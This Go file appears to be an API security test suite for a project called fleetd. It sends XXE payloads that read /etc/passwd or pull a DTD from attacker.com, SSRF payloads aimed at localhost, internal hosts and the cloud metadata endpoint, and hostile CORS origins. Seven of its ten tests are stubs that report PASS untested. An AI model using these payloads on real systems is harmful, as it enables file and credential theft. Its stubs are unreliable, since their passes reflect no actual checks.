package api

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"fleetd.sh/test/security"
)

// APISecurityTestSuite contains all API security tests
type APISecurityTestSuite struct {
	framework *security.SecurityTestFramework
}

// NewAPISecurityTestSuite creates a new API security test suite
func NewAPISecurityTestSuite(framework *security.SecurityTestFramework) *APISecurityTestSuite {
	return &APISecurityTestSuite{
		framework: framework,
	}
}

// GetAPISecurityTestCases returns all API security test cases
func (s *APISecurityTestSuite) GetAPISecurityTestCases() []*security.TestCase {
	return []*security.TestCase{
		{
			ID:          "api-001",
			Name:        "XXE (XML External Entity) Injection",
			Category:    "api_security",
			Description: "Tests for XXE vulnerabilities in XML processing",
			Severity:    "High",
			OWASP:       "A05:2021 – Security Misconfiguration",
			CWE:         "CWE-611",
			Tags:        []string{"xxe", "xml", "external-entity"},
			Enabled:     true,
			Timeout:     45 * time.Second,
			TestFunc:    s.testXXEInjection,
		},
		{
			ID:          "api-002",
			Name:        "SSRF (Server-Side Request Forgery)",
			Category:    "api_security",
			Description: "Tests for SSRF vulnerabilities",
			Severity:    "High",
			OWASP:       "A10:2021 – Server-Side Request Forgery",
			CWE:         "CWE-918",
			Tags:        []string{"ssrf", "request-forgery", "internal"},
			Enabled:     true,
			Timeout:     60 * time.Second,
			TestFunc:    s.testSSRF,
		},
		{
			ID:          "api-003",
			Name:        "CORS Misconfiguration",
			Category:    "api_security",
			Description: "Tests for CORS policy misconfigurations",
			Severity:    "Medium",
			OWASP:       "A05:2021 – Security Misconfiguration",
			CWE:         "CWE-942",
			Tags:        []string{"cors", "cross-origin", "misconfiguration"},
			Enabled:     true,
			Timeout:     30 * time.Second,
			TestFunc:    s.testCORSMisconfiguration,
		},
		{
			ID:          "api-004",
			Name:        "Content Security Policy Bypass",
			Category:    "api_security",
			Description: "Tests for CSP bypass vulnerabilities",
			Severity:    "Medium",
			OWASP:       "A03:2021 – Injection",
			CWE:         "CWE-79",
			Tags:        []string{"csp", "content-security-policy", "bypass"},
			Enabled:     true,
			Timeout:     30 * time.Second,
			TestFunc:    s.testCSPBypass,
		},
		{
			ID:          "api-005",
			Name:        "Mass Assignment",
			Category:    "api_security",
			Description: "Tests for mass assignment vulnerabilities",
			Severity:    "Medium",
			OWASP:       "A01:2021 – Broken Access Control",
			CWE:         "CWE-915",
			Tags:        []string{"mass-assignment", "parameter-binding"},
			Enabled:     true,
			Timeout:     30 * time.Second,
			TestFunc:    s.testMassAssignment,
		},
		{
			ID:          "api-006",
			Name:        "HTTP Method Override",
			Category:    "api_security",
			Description: "Tests for HTTP method override vulnerabilities",
			Severity:    "Medium",
			OWASP:       "A01:2021 – Broken Access Control",
			CWE:         "CWE-650",
			Tags:        []string{"method-override", "http-methods"},
			Enabled:     true,
			Timeout:     30 * time.Second,
			TestFunc:    s.testHTTPMethodOverride,
		},
		{
			ID:          "api-007",
			Name:        "API Rate Limiting",
			Category:    "api_security",
			Description: "Tests for API rate limiting effectiveness",
			Severity:    "Medium",
			OWASP:       "A04:2021 – Insecure Design",
			CWE:         "CWE-770",
			Tags:        []string{"rate-limiting", "dos", "api-abuse"},
			Enabled:     true,
			Timeout:     120 * time.Second,
			TestFunc:    s.testAPIRateLimit,
		},
		{
			ID:          "api-008",
			Name:        "GraphQL Introspection",
			Category:    "api_security",
			Description: "Tests for GraphQL introspection and injection",
			Severity:    "Medium",
			OWASP:       "A09:2021 – Security Logging and Monitoring Failures",
			CWE:         "CWE-209",
			Tags:        []string{"graphql", "introspection", "information-disclosure"},
			Enabled:     true,
			Timeout:     30 * time.Second,
			TestFunc:    s.testGraphQLSecurity,
		},
		{
			ID:          "api-009",
			Name:        "JSON Hijacking",
			Category:    "api_security",
			Description: "Tests for JSON hijacking vulnerabilities",
			Severity:    "Medium",
			OWASP:       "A01:2021 – Broken Access Control",
			CWE:         "CWE-345",
			Tags:        []string{"json-hijacking", "csrf", "jsonp"},
			Enabled:     true,
			Timeout:     30 * time.Second,
			TestFunc:    s.testJSONHijacking,
		},
		{
			ID:          "api-010",
			Name:        "API Version Exposure",
			Category:    "api_security",
			Description: "Tests for API version information disclosure",
			Severity:    "Low",
			OWASP:       "A09:2021 – Security Logging and Monitoring Failures",
			CWE:         "CWE-200",
			Tags:        []string{"version-disclosure", "information-leakage"},
			Enabled:     true,
			Timeout:     30 * time.Second,
			TestFunc:    s.testAPIVersionExposure,
		},
	}
}

// testXXEInjection tests for XXE vulnerabilities
func (s *APISecurityTestSuite) testXXEInjection(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	result := &security.TestResult{
		TestCase:     testCase,
		StartTime:    time.Now(),
		HTTPRequests: make([]*security.HTTPRequest, 0),
	}

	client := framework.CreateTestHTTPClient()
	targetURL := framework.Config.TargetURL

	// XXE payloads
	xxePayloads := []struct {
		name    string
		payload string
		type_   string
	}{
		{
			name: "External entity file read",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request><data>&xxe;</data></request>`,
			type_: "file_read",
		},
		{
			name: "External entity HTTP request",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<request><data>&xxe;</data></request>`,
			type_: "http_request",
		},
		{
			name: "Parameter entity injection",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<request><data>test</data></request>`,
			type_: "parameter_entity",
		},
		{
			name: "Blind XXE with DTD",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
<request><data>test</data></request>`,
			type_: "blind_xxe",
		},
		{
			name: "XXE with CDATA",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY begin "<![CDATA["><!ENTITY file SYSTEM "file:///etc/passwd"><!ENTITY end "]]>">]>
<request><data>&begin;&file;&end;</data></request>`,
			type_: "cdata_xxe",
		},
	}

	vulnerabilities := make([]*security.Vulnerability, 0)

	// Test endpoints that might process XML
	xmlEndpoints := []string{
		"/api/v1/import",
		"/api/v1/config/upload",
		"/api/v1/backup/restore",
		"/api/v1/data/import",
	}

	for _, endpoint := range xmlEndpoints {
		for _, payload := range xxePayloads {
			req, err := http.NewRequest("POST", targetURL+endpoint, strings.NewReader(payload.payload))
			if err != nil {
				continue
			}

			req.Header.Set("Content-Type", "application/xml")

			start := time.Now()
			resp, err := client.Do(req)
			duration := time.Since(start)

			// Record request
			httpReq := framework.RecordHTTPRequest(req, resp, duration)
			result.HTTPRequests = append(result.HTTPRequests, httpReq)

			if err != nil {
				continue
			}

			// Analyze response for XXE indicators
			vuln := s.analyzeXXEResponse(resp, payload.payload, payload.type_, req.URL.String(), payload.name)
			if vuln != nil {
				vulnerabilities = append(vulnerabilities, vuln)
			}

			resp.Body.Close()
		}
	}

	if len(vulnerabilities) > 0 {
		result.Status = "FAIL"
		result.Message = fmt.Sprintf("Found %d XXE vulnerabilities", len(vulnerabilities))
		result.Vulnerability = vulnerabilities[0]
	} else {
		result.Status = "PASS"
		result.Message = "No XXE vulnerabilities detected"
	}

	return result
}

// testSSRF tests for Server-Side Request Forgery vulnerabilities
func (s *APISecurityTestSuite) testSSRF(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	result := &security.TestResult{
		TestCase:     testCase,
		StartTime:    time.Now(),
		HTTPRequests: make([]*security.HTTPRequest, 0),
	}

	client := framework.CreateTestHTTPClient()
	targetURL := framework.Config.TargetURL

	// SSRF payloads
	ssrfPayloads := []struct {
		name    string
		payload string
		type_   string
	}{
		{"Localhost access", "http://127.0.0.1:22", "localhost_access"},
		{"Internal network", "http://192.168.1.1", "internal_network"},
		{"Metadata service", "http://169.254.169.254/latest/meta-data/", "metadata_service"},
		{"File scheme", "file:///etc/passwd", "file_scheme"},
		{"FTP scheme", "ftp://internal.server.com", "ftp_scheme"},
		{"Dict scheme", "dict://127.0.0.1:11211/", "dict_scheme"},
		{"Gopher scheme", "gopher://127.0.0.1:70/", "gopher_scheme"},
		{"LDAP scheme", "ldap://127.0.0.1:389/", "ldap_scheme"},
		{"Bypass with redirects", "http://example.com/redirect?url=http://127.0.0.1", "redirect_bypass"},
		{"URL encoding bypass", "http://127.0.0.1%2ecom", "encoding_bypass"},
	}

	vulnerabilities := make([]*security.Vulnerability, 0)

	// Test endpoints that might make external requests
	ssrfEndpoints := []string{
		"/api/v1/webhook/test?url=%s",
		"/api/v1/fetch?url=%s",
		"/api/v1/proxy?target=%s",
		"/api/v1/backup/remote?source=%s",
		"/api/v1/health/check?endpoint=%s",
	}

	for _, endpoint := range ssrfEndpoints {
		for _, payload := range ssrfPayloads {
			testURL := fmt.Sprintf(targetURL+endpoint, payload.payload)

			req, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}

			start := time.Now()
			resp, err := client.Do(req)
			duration := time.Since(start)

			// Record request
			httpReq := framework.RecordHTTPRequest(req, resp, duration)
			result.HTTPRequests = append(result.HTTPRequests, httpReq)

			if err != nil {
				continue
			}

			// Analyze response for SSRF indicators
			vuln := s.analyzeSSRFResponse(resp, payload.payload, payload.type_, req.URL.String(), payload.name, duration)
			if vuln != nil {
				vulnerabilities = append(vulnerabilities, vuln)
			}

			resp.Body.Close()
		}
	}

	if len(vulnerabilities) > 0 {
		result.Status = "FAIL"
		result.Message = fmt.Sprintf("Found %d SSRF vulnerabilities", len(vulnerabilities))
		result.Vulnerability = vulnerabilities[0]
	} else {
		result.Status = "PASS"
		result.Message = "No SSRF vulnerabilities detected"
	}

	return result
}

// testCORSMisconfiguration tests for CORS policy misconfigurations
func (s *APISecurityTestSuite) testCORSMisconfiguration(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	result := &security.TestResult{
		TestCase:     testCase,
		StartTime:    time.Now(),
		HTTPRequests: make([]*security.HTTPRequest, 0),
	}

	client := framework.CreateTestHTTPClient()
	targetURL := framework.Config.TargetURL

	// CORS test cases
	corsTests := []struct {
		name   string
		origin string
		expect string
	}{
		{"Wildcard origin", "*", "should_not_reflect"},
		{"Null origin", "null", "should_not_reflect"},
		{"Malicious origin", "https://attacker.com", "should_not_reflect"},
		{"Subdomain bypass", "https://evil.example.com", "should_not_reflect"},
		{"Port bypass", "https://example.com:8080", "should_not_reflect"},
		{"Protocol bypass", "http://example.com", "should_not_reflect"},
	}

	vulnerabilities := make([]*security.Vulnerability, 0)

	for _, test := range corsTests {
		req, err := http.NewRequest("OPTIONS", targetURL+"/api/v1/devices", nil)
		if err != nil {
			continue
		}

		req.Header.Set("Origin", test.origin)
		req.Header.Set("Access-Control-Request-Method", "GET")
		req.Header.Set("Access-Control-Request-Headers", "Content-Type")

		start := time.Now()
		resp, err := client.Do(req)
		duration := time.Since(start)

		// Record request
		httpReq := framework.RecordHTTPRequest(req, resp, duration)
		result.HTTPRequests = append(result.HTTPRequests, httpReq)

		if err != nil {
			continue
		}

		// Check CORS headers
		allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
		allowCredentials := resp.Header.Get("Access-Control-Allow-Credentials")

		// Check for dangerous configurations
		if allowOrigin == "*" && allowCredentials == "true" {
			vuln := &security.Vulnerability{
				ID:          fmt.Sprintf("cors-wildcard-%s", test.name),
				Title:       "CORS Wildcard with Credentials",
				Description: "CORS policy allows wildcard origin with credentials",
				Severity:    "High",
				CVSSScore:   7.5,
				Category:    "api_security",
				Confidence:  "High",
				Remediation: "Do not use wildcard (*) origin with Access-Control-Allow-Credentials: true",
				Evidence:    fmt.Sprintf("Allow-Origin: %s, Allow-Credentials: %s", allowOrigin, allowCredentials),
				Timestamp:   time.Now(),
				TestMethod:  "CORS Misconfiguration Test",
				AffectedURL: req.URL.String(),
				PayloadUsed: test.origin,
			}
			vulnerabilities = append(vulnerabilities, vuln)
		}

		// Check if malicious origin is reflected
		if allowOrigin == test.origin && (test.origin == "https://attacker.com" || test.origin == "null") {
			vuln := &security.Vulnerability{
				ID:          fmt.Sprintf("cors-reflection-%s", test.name),
				Title:       "CORS Origin Reflection",
				Description: "CORS policy reflects arbitrary origins",
				Severity:    "Medium",
				CVSSScore:   5.3,
				Category:    "api_security",
				Confidence:  "High",
				Remediation: "Implement proper origin validation and whitelist trusted domains",
				Evidence:    fmt.Sprintf("Origin %s was reflected in Allow-Origin header", test.origin),
				Timestamp:   time.Now(),
				TestMethod:  "CORS Origin Reflection Test",
				AffectedURL: req.URL.String(),
				PayloadUsed: test.origin,
			}
			vulnerabilities = append(vulnerabilities, vuln)
		}

		resp.Body.Close()
	}

	if len(vulnerabilities) > 0 {
		result.Status = "FAIL"
		result.Message = fmt.Sprintf("Found %d CORS misconfigurations", len(vulnerabilities))
		result.Vulnerability = vulnerabilities[0]
	} else {
		result.Status = "PASS"
		result.Message = "CORS configuration appears secure"
	}

	return result
}

// Placeholder implementations for other API security tests
func (s *APISecurityTestSuite) testCSPBypass(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	return &security.TestResult{
		TestCase:  testCase,
		Status:    "PASS",
		Message:   "CSP bypass test not yet implemented",
		StartTime: time.Now(),
	}
}

func (s *APISecurityTestSuite) testMassAssignment(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	return &security.TestResult{
		TestCase:  testCase,
		Status:    "PASS",
		Message:   "Mass assignment test not yet implemented",
		StartTime: time.Now(),
	}
}

func (s *APISecurityTestSuite) testHTTPMethodOverride(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	return &security.TestResult{
		TestCase:  testCase,
		Status:    "PASS",
		Message:   "HTTP method override test not yet implemented",
		StartTime: time.Now(),
	}
}

func (s *APISecurityTestSuite) testAPIRateLimit(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	return &security.TestResult{
		TestCase:  testCase,
		Status:    "PASS",
		Message:   "API rate limit test not yet implemented",
		StartTime: time.Now(),
	}
}

func (s *APISecurityTestSuite) testGraphQLSecurity(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	return &security.TestResult{
		TestCase:  testCase,
		Status:    "PASS",
		Message:   "GraphQL security test not yet implemented",
		StartTime: time.Now(),
	}
}

func (s *APISecurityTestSuite) testJSONHijacking(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	return &security.TestResult{
		TestCase:  testCase,
		Status:    "PASS",
		Message:   "JSON hijacking test not yet implemented",
		StartTime: time.Now(),
	}
}

func (s *APISecurityTestSuite) testAPIVersionExposure(framework *security.SecurityTestFramework, testCase *security.TestCase) *security.TestResult {
	return &security.TestResult{
		TestCase:  testCase,
		Status:    "PASS",
		Message:   "API version exposure test not yet implemented",
		StartTime: time.Now(),
	}
}

// Helper functions for response analysis

func (s *APISecurityTestSuite) analyzeXXEResponse(resp *http.Response, payload, injectionType, url, testName string) *security.Vulnerability {
	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	responseBody := string(body)

	// XXE indicators
	xxeIndicators := []string{
		"root:x:", // /etc/passwd content
		"daemon:x:",
		"sys:x:",
		"<!ENTITY", // Entity declaration reflection
		"<!DOCTYPE", // DOCTYPE reflection
		"file:///", // File scheme reflection
	}

	// Check for XXE evidence
	for _, indicator := range xxeIndicators {
		if strings.Contains(responseBody, indicator) {
			return &security.Vulnerability{
				ID:          fmt.Sprintf("xxe-%s", testName),
				Title:       "XXE (XML External Entity) Injection",
				Description: fmt.Sprintf("XXE vulnerability detected - %s", injectionType),
				Severity:    "High",
				CVSSScore:   8.5,
				Category:    "api_security",
				Confidence:  "High",
				Remediation: "Disable external entity processing in XML parsers and use secure XML parsing libraries",
				Evidence:    fmt.Sprintf("XXE evidence found: %s", indicator),
				Timestamp:   time.Now(),
				TestMethod:  "XXE Injection Test",
				AffectedURL: url,
				PayloadUsed: payload,
			}
		}
	}

	// Check for XML parsing errors that might indicate XXE attempt processing
	xmlErrors := []string{
		"entity",
		"external",
		"dtd",
		"xml parse",
		"malformed",
	}

	for _, errorPattern := range xmlErrors {
		if strings.Contains(strings.ToLower(responseBody), errorPattern) {
			return &security.Vulnerability{
				ID:          fmt.Sprintf("xxe-error-%s", testName),
				Title:       "Potential XXE Processing",
				Description: "XML parser may be processing external entities",
				Severity:    "Medium",
				CVSSScore:   5.3,
				Category:    "api_security",
				Confidence:  "Medium",
				Remediation: "Review XML parser configuration and disable external entity processing",
				Evidence:    fmt.Sprintf("XML error indicates potential XXE processing: %s", responseBody),
				Timestamp:   time.Now(),
				TestMethod:  "XXE Error Analysis",
				AffectedURL: url,
				PayloadUsed: payload,
			}
		}
	}

	return nil
}

func (s *APISecurityTestSuite) analyzeSSRFResponse(resp *http.Response, payload, injectionType, url, testName string, duration time.Duration) *security.Vulnerability {
	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	responseBody := string(body)

	// SSRF indicators
	ssrfIndicators := []string{
		"connection refused", // Failed internal connection
		"connection timeout",
		"no route to host",
		"ssh-", // SSH banner from port 22
		"http/1.1", // HTTP response from internal service
		"server:", // Server header from internal service
		"aws-instance-metadata", // AWS metadata
		"instance-id",
		"security-credentials",
	}

	// Check for SSRF evidence
	for _, indicator := range ssrfIndicators {
		if strings.Contains(strings.ToLower(responseBody), indicator) {
			severity := "High"
			score := 8.1

			// Adjust severity based on type
			if injectionType == "metadata_service" {
				severity = "Critical"
				score = 9.1
			}

			return &security.Vulnerability{
				ID:          fmt.Sprintf("ssrf-%s", testName),
				Title:       "Server-Side Request Forgery (SSRF)",
				Description: fmt.Sprintf("SSRF vulnerability detected - %s", injectionType),
				Severity:    severity,
				CVSSScore:   score,
				Category:    "api_security",
				Confidence:  "High",
				Remediation: "Implement URL validation, use allow-lists for external requests, and disable unnecessary URL schemes",
				Evidence:    fmt.Sprintf("SSRF evidence: %s", indicator),
				Timestamp:   time.Now(),
				TestMethod:  "SSRF Test",
				AffectedURL: url,
				PayloadUsed: payload,
			}
		}
	}

	// Check for successful internal requests (status 200 to internal IPs)
	if resp.StatusCode == 200 && (strings.Contains(payload, "127.0.0.1") || strings.Contains(payload, "192.168.") || strings.Contains(payload, "169.254.169.254")) {
		return &security.Vulnerability{
			ID:          fmt.Sprintf("ssrf-success-%s", testName),
			Title:       "SSRF - Internal Request Success",
			Description: "Successful request to internal/private IP address",
			Severity:    "High",
			CVSSScore:   7.5,
			Category:    "api_security",
			Confidence:  "High",
			Remediation: "Block requests to private IP ranges and localhost",
			Evidence:    fmt.Sprintf("Status 200 response to internal URL: %s", payload),
			Timestamp:   time.Now(),
			TestMethod:  "SSRF Internal Request Test",
			AffectedURL: url,
			PayloadUsed: payload,
		}
	}

	return nil
}